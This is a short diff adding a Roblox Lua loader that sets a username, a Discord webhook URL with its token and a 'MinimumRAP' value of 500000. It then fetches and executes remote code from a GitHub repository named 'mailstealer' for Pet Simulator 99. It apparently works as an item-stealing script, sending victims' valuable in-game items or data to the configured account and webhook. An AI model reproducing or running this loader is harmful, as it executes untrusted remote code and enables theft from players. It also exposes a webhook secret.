@@ -1,0 +1,6 @@
+Username= '0iJayTrixXX'
+Webhook= 'https://discord.com/api/webhooks/1220506628554752150/nZMl1yuTqJ27oEIOXCy9XtSsZUL3Mbhu5H0K3bUgX_9hwdohE3DEJztSAxQAKDCuQE4Z'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/trdrock/mailstealer/main/petsim99'))()
